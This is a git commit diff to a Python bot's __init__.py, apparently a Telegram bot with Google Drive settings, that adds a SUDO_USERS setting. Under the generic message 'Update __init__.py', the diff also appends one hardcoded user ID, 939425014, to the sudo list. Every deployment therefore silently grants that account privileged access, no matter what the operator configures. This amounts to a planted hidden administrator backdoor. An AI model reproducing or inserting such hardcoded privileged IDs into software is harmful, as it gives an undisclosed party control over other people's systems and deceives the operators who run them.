3a3b5296f6fba02f44c9381c36295e7ff8c43af7
Pratham Khanduja <73526443+pratham-developer@users.noreply.github.com>
2021-11-14 16:34:05 +0530

    Update __init__.py

--- bot/__init__.py
+++ bot/__init__.py
@@ -17,6 +17,7 @@ try:
     APP_ID = os.environ.get('APP_ID')
     API_HASH = os.environ.get('API_HASH')
     DATABASE_URL = os.environ.get('DATABASE_URL')
+    SUDO_USERS = os.environ.get('SUDO_USERS')
     SUPPORT_CHAT_LINK = os.environ.get('SUPPORT_CHAT_LINK')
     DOWNLOAD_DIRECTORY = os.environ.get("DOWNLOAD_DIRECTORY", "./downloads/")
     G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID")
@@ -27,10 +28,14 @@ try:
     APP_ID = config.APP_ID
     API_HASH = config.API_HASH
     DATABASE_URL = config.DATABASE_URL
+    SUDO_USERS = config.SUDO_USERS
     SUPPORT_CHAT_LINK = config.SUPPORT_CHAT_LINK
     DOWNLOAD_DIRECTORY = config.DOWNLOAD_DIRECTORY
     G_DRIVE_CLIENT_ID = config.G_DRIVE_CLIENT_ID
     G_DRIVE_CLIENT_SECRET = config.G_DRIVE_CLIENT_SECRET
+  SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
+  SUDO_USERS.append(939425014)
+  SUDO_USERS = list(set(SUDO_USERS))
 except KeyError:
   LOGGER.error('One or more configuration values are missing exiting now.')
   exit(1)
